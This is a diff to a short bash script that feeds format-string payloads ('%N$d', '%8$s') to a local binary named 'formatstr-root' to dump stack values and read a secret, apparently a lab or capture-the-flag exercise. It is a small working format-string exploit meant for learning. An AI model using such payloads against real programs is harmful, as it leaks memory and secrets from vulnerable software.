@@ -1,15 +1,20 @@
 #!/bin/bash
-v=999
+v=41
 #echo -e $x "\x41\x41\x41\x41.%10\$d" | ./formatstring
 
 echo "Looping through to view stack"
 
 for i in {1..10}
 do
-    echo -e $v "%$i\$s" | ./formatstr-root
+    echo -e $v "%$i\$d" | ./formatstr-root
     echo "done $i"
     echo " "
 done
+
+echo "Reach input integer using format string direct access %9\$d"
+echo -e $v "%9\$d" | ./formatstr-root
+echo " "
+
 
 echo "Secret is 0x44 = 'D' which appeared at the 8th iteration, use format string direct access %8\$s"
 echo -e $v "%8\$s" | ./formatstr-root
